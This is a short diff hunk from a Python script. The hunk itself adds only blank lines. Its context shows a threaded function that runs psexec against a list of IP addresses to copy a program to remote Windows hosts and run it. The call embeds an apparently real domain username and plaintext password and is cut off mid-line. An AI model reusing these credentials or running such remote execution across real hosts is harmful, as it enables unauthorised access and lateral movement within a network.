@@ -97,6 +97,8 @@ def threaded_function(address):
             psexecFunc(psexec)
 
 
+
+
 def sending(ip):
     run = subprocess.Popen(["copy "], stdout=sys.stdout)
     run = subprocess.Popen(["psexec", "-d", "-c", "\\\\"+ip, "-u", "eapteka\\d.artamonov2",  "-p", "Df4kq-poECW1",
